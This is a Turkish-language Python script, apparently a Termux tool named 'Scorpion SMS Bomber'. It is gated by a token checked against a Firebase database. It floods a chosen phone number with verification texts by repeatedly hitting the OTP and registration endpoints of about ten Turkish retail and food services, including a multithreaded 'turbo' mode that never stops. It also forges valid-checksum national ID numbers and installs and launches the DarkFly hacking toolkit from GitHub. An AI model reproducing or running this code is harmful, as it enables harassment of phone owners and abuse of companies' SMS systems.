import requests
from random import choice, randint
from string import ascii_lowercase
from colorama import Fore, Style, Back
from time import sleep
from os import system
import threading
import sys

class TokenManager:
    def __init__(self):
        self.token_url = "https://scorpion292439.github.io/scorpion-sms-bomber/"
        self.verify_url = "https://ipchecer-default-rtdb.firebaseio.com/tokens.json"
        self.token = None

    def get_token_from_user(self):
        system("clear")
        print(f"""
{Fore.RED + Style.BRIGHT}
    ╔══════════════════════════════════════════════════════════════════════════════╗
    ║                       TOKEN DOĞRULAMA SİSTEMİ                               ║
    ╚══════════════════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}""")
        print(f"{Fore.YELLOW + Style.BRIGHT}Token Yok! Lütfen aşağıdaki adresten token alın:{Style.RESET_ALL}")
        print(f"{Fore.CYAN + Style.BRIGHT}Site: {self.token_url}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW + Style.BRIGHT}Token: {Fore.GREEN}", end="")
        token = input().strip()

        if self.verify_token(token):
            self.token = token
            print(f"{Fore.GREEN + Style.BRIGHT}Token doğrulandı! Scorpion SMS Bomber başlatılıyor...{Style.RESET_ALL}")
            sleep(2)
            return True
        else:
            print(f"{Fore.RED + Style.BRIGHT}Geçersiz token!{Style.RESET_ALL}")
            sleep(3)
            return False

    def verify_token(self, token):
        try:
            response = requests.get(self.verify_url, timeout=10)
            if response.status_code == 200:
                tokens_data = response.json()
                if tokens_data:
                    for key, data in tokens_data.items():
                        if data.get('token') == token:
                            print(f"{Fore.GREEN + Style.BRIGHT}Hoş geldiniz: {data.get('email', 'Kullanıcı')}{Style.RESET_ALL}")
                            return True
            return False
        except:
            return False

class SendSms:
    adet = 0

    def __init__(self, phone, mail):
        print(f"{Fore.RED + Style.BRIGHT}Scorpion Strike Initialized! Target Locked: {Fore.GREEN + Style.BRIGHT}{phone}{Style.RESET_ALL}")
        rakam = []
        tcNo = ""
        rakam.append(randint(1,9))
        for i in range(1, 9):
            rakam.append(randint(0,9))
        rakam.append(((rakam[0] + rakam[2] + rakam[4] + rakam[6] + rakam[8]) * 7 - (rakam[1] + rakam[3] + rakam[5] + rakam[7])) % 10)
        rakam.append((sum(rakam[:10])) % 10)
        for r in rakam:
            tcNo += str(r)
        self.tc = tcNo
        self.phone = str(phone)
        self.mail = mail if mail else ''.join(choice(ascii_lowercase) for _ in range(22)) + "@gmail.com"

    def KahveDunyasi(self):
        try:
            r = requests.post("https://api.kahvedunyasi.com:443/api/v1/auth/account/register/phone-number",
                            headers={"Content-Type":"application/json","X-Language-Id":"tr-TR","X-Client-Platform":"web"},
                            json={"countryCode":"90","phoneNumber":self.phone}, timeout=6)
            if r.json()["processStatus"] == "Success":
                print(f"{Fore.GREEN + Style.BRIGHT}[HIT] {self.phone} → kahvedunyasi.com{Style.RESET_ALL}")
                self.adet += 1
        except: print(f"{Fore.RED}[MISS] kahvedunyasi.com{Style.RESET_ALL}")

    def Bim(self):
        try:
            r = requests.post("https://bim.veesk.net:443/service/v1.0/account/login", json={"phone": self.phone}, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.GREEN + Style.BRIGHT}[HIT] {self.phone} → bim.veesk.net{Style.RESET_ALL}")
                self.adet += 1
        except: print(f"{Fore.RED}[MISS] bim.veesk.net{Style.RESET_ALL}")

    def Evidea(self):
        try:
            url = "https://www.evidea.com:443/users/register/"
            data = f"--boundary\r\nContent-Disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--boundary\r\nContent-Disposition: form-data; name=\"phone\"\r\n\r\n0{self.phone}\r\n--boundary--\r\n"
            headers = {"Content-Type": "multipart/form-data; boundary=boundary", "X-App-Type": "akinon-mobile"}
            r = requests.post(url, headers=headers, data=data, timeout=6)
            if r.status_code == 202:
                print(f"{Fore.GREEN + Style.BRIGHT}[HIT] {self.phone} → evidea.com{Style.RESET_ALL}")
                self.adet += 1
        except: print(f"{Fore.RED}[MISS] evidea.com{Style.RESET_ALL}")

    def Naosstars(self):
        try:
            r = requests.post("https://api.naosstars.com:443/api/smsSend/9c9fa861-cc5d-43b0-b4ea-1b541be15350",
                            headers={"Uniqid":"9c9fa861-cc5d-43c0-b4ea-1b541be15351"}, json={"telephone":"+90"+self.phone,"type":"register"}, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.GREEN + Style.BRIGHT}[HIT] {self.phone} → naosstars.com{Style.RESET_ALL}")
                self.adet += 1
        except: print(f"{Fore.RED}[MISS] naosstars.com{Style.RESET_ALL}")

    def Koton(self):
        try:
            url = "https://www.koton.com:443/users/register/"
            data = f"--boundary\r\nContent-Disposition: form-data; name=\"phone\"\r\n\r\n0{self.phone}\r\n--boundary--\r\n"
            r = requests.post(url, headers={"Content-Type":"multipart/form-data; boundary=boundary","X-App-Type":"akinon-mobile"}, data=data, timeout=6)
            if r.status_code == 202:
                print(f"{Fore.GREEN + Style.BRIGHT}[HIT] {self.phone} → koton.com{Style.RESET_ALL}")
                self.adet += 1
        except: print(f"{Fore.RED}[MISS] koton.com{Style.RESET_ALL}")

    def Metro(self):
        try:
            r = requests.post("https://mobile.metro-tr.com:443/api/mobileAuth/validateSmsSend",
                            json={"methodType":"2","mobilePhoneNumber":self.phone}, timeout=6)
            if r.json()["status"] == "success":
                print(f"{Fore.GREEN + Style.BRIGHT}[HIT] {self.phone} → metro-tr.com{Style.RESET_ALL}")
                self.adet += 1
        except: print(f"{Fore.RED}[MISS] metro-tr.com{Style.RESET_ALL}")

    def File(self):
        try:
            r = requests.post("https://api.filemarket.com.tr:443/v1/otp/send", json={"mobilePhoneNumber":"90"+self.phone}, timeout=6)
            if r.json()["responseType"] == "SUCCESS":
                print(f"{Fore.GREEN + Style.BRIGHT}[HIT] {self.phone} → filemarket.com.tr{Style.RESET_ALL}")
                self.adet += 1
        except: print(f"{Fore.RED}[MISS] filemarket.com.tr{Style.RESET_ALL}")

    def Komagene(self):
        try:
            r = requests.post("https://gateway.komagene.com.tr:443/auth/auth/smskodugonder", json={"FirmaId":32,"Telefon":self.phone}, timeout=6)
            if r.json()["Success"]:
                print(f"{Fore.GREEN + Style.BRIGHT}[HIT] {self.phone} → komagene.com.tr{Style.RESET_ALL}")
                self.adet += 1
        except: print(f"{Fore.RED}[MISS] komagene.com.tr{Style.RESET_ALL}")

    def Porty(self):
        try:
            r = requests.post("https://panel.porty.tech:443/api.php?", json={"job":"start_login","phone":self.phone}, timeout=6)
            if r.json().get("status") == "success":
                print(f"{Fore.GREEN + Style.BRIGHT}[HIT] {self.phone} → porty.tech{Style.RESET_ALL}")
                self.adet += 1
        except: print(f"{Fore.RED}[MISS] porty.tech{Style.RESET_ALL}")

    def Dominos(self):
        try:
            r = requests.post("https://frontend.dominos.com.tr:443/api/customer/sendOtpCode",
                            json={"email":self.mail,"mobilePhone":self.phone}, timeout=6)
            if r.json()["isSuccess"]:
                print(f"{Fore.GREEN + Style.BRIGHT}[HIT] {self.phone} → dominos.com.tr{Style.RESET_ALL}")
                self.adet += 1
        except: print(f"{Fore.RED}[MISS] dominos.com.tr{Style.RESET_ALL}")

def print_main_banner():
    system("clear")
    print(f"""
{Fore.RED + Style.BRIGHT}
    ╔══════════════════════════════════════════════════════════════════════════════╗
    ║                          SCORPION TOOLKIT                                    ║
    ╚══════════════════════════════════════════════════════════════════════════════╝
{Fore.YELLOW + Style.BRIGHT} v2.0 | Powered by {Fore.RED + Style.BRIGHT}Scorpion{Fore.YELLOW + Style.BRIGHT} | Termux Edition
{Fore.GREEN + Style.BRIGHT} Token Doğrulama Sistemi Aktif
{Style.RESET_ALL}
""")

def sms_bomber_menu():
    servisler = [attr for attr in dir(SendSms) if callable(getattr(SendSms, attr)) and not attr.startswith("__")]
    while True:
        system("clear")
        print(f"{Fore.RED + Style.BRIGHT}SCORPION SMS BOMBER{Style.RESET_ALL}\n")
        print(f"{Fore.YELLOW}1. Normal Mod   2. Turbo Mod   3. Geri{Style.RESET_ALL}")
        try: secim = int(input(f"{Fore.CYAN}Seçim: {Fore.GREEN}"))
        except: continue
        
        if secim == 3: break
        tel = input(f"{Fore.YELLOW}Telefon (+90 olmadan): {Fore.GREEN}")
        if len(tel) != 10: continue
        mail = input(f"{Fore.YELLOW}Mail (boş bırakabilirsin): {Fore.GREEN}")
        sms = SendSms(tel, mail)
        
        if secim == 1:
            kere = int(input(f"{Fore.YELLOW}Kaç adet (sonsuz için boş): {Fore.GREEN}") or 0)
            aralik = int(input(f"{Fore.YELLOW}Saniye aralığı: {Fore.GREEN}"))
            for _ in range(kere if kere else 999999):
                for servis in servisler:
                    getattr(sms, servis)()
                    sleep(aralik)
        elif secim == 2:
            def turbo():
                while True:
                    for servis in servisler:
                        threading.Thread(target=getattr(sms, servis)).start()
            threading.Thread(target=turbo, daemon=True).start()
            input(f"{Fore.YELLOW}Durdurmak için Enter...{Style.RESET_ALL}")

def darkfly_installer():
    system("clear")
    print(f"{Fore.RED + Style.BRIGHT}DARKFLY TOOL KURULUM{Style.RESET_ALL}\n")
    for cmd in ["pkg install python2 -y", "pkg install git -y", 
                "git clone https://github.com/Ranginang67/DarkFly-Tool", 
                "cd DarkFly-Tool && python2 install.py"]:
        print(f"{Fore.CYAN}[RUN] {cmd}{Style.RESET_ALL}")
        system(cmd)
        sleep(1)

    system("clear")
    print("\n" * 4)
    print(f"{Fore.MAGENTA + Style.BRIGHT}                ██████╗  █████╗ ██████╗ ██╗  ██╗██████╗ ██╗   ██╗")
    print(f"                ██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝██╔══██╗╚██╗ ██╔╝")
    print(f"                ██║  ██║███████║██████╔╝█████╔╝ ██████╔╝ ╚████╔╝ ")
    print(f"                ██║  ██║██╔══██║██╔══██╗██╔═██╗ ██╔══██╗  ╚██╔╝  ")
    print(f"                ██████╔╝██║  ██║██║  ██║██║  ██╗██║  ██║   ██║   ")
    print(f"                ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   {Style.RESET_ALL}\n")
    print(f"{Fore.GREEN + Style.BRIGHT}                   KURULUM TAMAMLANDI!{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}       Artık sadece \"DarkFly\" yazarak çalıştırabilirsin{Style.RESET_ALL}\n")
    sleep(3)
    print(f"{Fore.CYAN}DarkFly başlatılıyor...{Style.RESET_ALL}")
    sleep(2)
    system("DarkFly")  # İşte bu satır otomatik "DarkFly" yazıp Enter basıyor!
    print(f"\n{Fore.YELLOW}DarkFly kapatıldı. Ana menüye dönmek için Enter'a bas...{Style.RESET_ALL}")
    input()

def main():
    token_manager = TokenManager()
    while token_manager.token is None:
        if not token_manager.get_token_from_user():
            continue
        break

    while True:
        print_main_banner()
        try:
            secim = input(f"{Fore.MAGENTA + Style.BRIGHT}╔═[ SCORPION MAIN MENU ]═╗{Style.RESET_ALL}\n"
                          f"{Fore.CYAN}║ 1. SMS Bomber                {Fore.WHITE}║{Style.RESET_ALL}\n"
                          f"{Fore.CYAN}║ 2. DarkFly Tool Kur & Başlat {Fore.WHITE}║{Style.RESET_ALL}\n"
                          f"{Fore.CYAN}║ 3. Çıkış                     {Fore.WHITE}║{Style.RESET_ALL}\n"
                          f"{Fore.MAGENTA + Style.BRIGHT}╚{'═' * 42}╝{Style.RESET_ALL}\n\n"
                          f"{Fore.YELLOW}Seçim → {Fore.GREEN}")
            secim = int(secim)
        except:
            print(f"{Fore.RED}Geçersiz giriş!{Style.RESET_ALL}")
            sleep(2)
            continue

        if secim == 1:
            sms_bomber_menu()
        elif secim == 2:
            darkfly_installer()
        elif secim == 3:
            print(f"{Fore.RED + Style.BRIGHT}Çıkış yapılıyor... Güle güle!{Style.RESET_ALL}")
            sleep(2)
            sys.exit(0)

if __name__ == "__main__":
    main()